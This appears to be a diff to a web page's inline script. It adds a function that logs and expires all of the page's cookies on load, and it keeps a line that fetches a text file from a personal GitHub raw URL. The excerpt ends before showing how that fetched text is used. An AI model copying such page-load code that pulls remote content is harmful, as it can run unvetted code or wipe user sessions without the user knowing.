@@ -4,10 +4,24 @@
 </head>
 <body>
   <script>
-		var id = document.getElementById("cookie_id").value;
-		var today = new Date();
-		today.setTime(today.getTime() - 1*24*60*60*1000);
-		document.cookie = escape(id)+"=; path=/; expires="+today.toUTCString()+";";
+const allDelCookies = (domain, path) => {
+  // const doc = document;
+  domain = domain || document.domain;
+  path = path || '/';
+  const cookies = document.cookie.split('; '); // 배열로 반환
+  console.log(cookies);
+  const expiration = 'Sat, 01 Jan 1972 00:00:00 GMT';
+  if (!document.cookie) {
+  } else {
+    for (i = 0; i < cookies.length; i++) {
+      // const uname = cookies[i].split('=')[0];
+      // document.cookie = `${uname}=; expires=${expiration}`;
+      document.cookie = cookies[i].split('=')[0] + '=; expires=' + expiration;
+      // document.cookie = cookies[i].split('=')[0] + '=; expires=' + expiration + '; domain =' + domain;
+    }
+  }
+};
+	  allDelCookies();
 fetch('https://raw.githubusercontent.com/1top10000/1top10000.github.io/main/dx.txt').then(function(res){
     res.text().then(function(text){
         var dx = "";
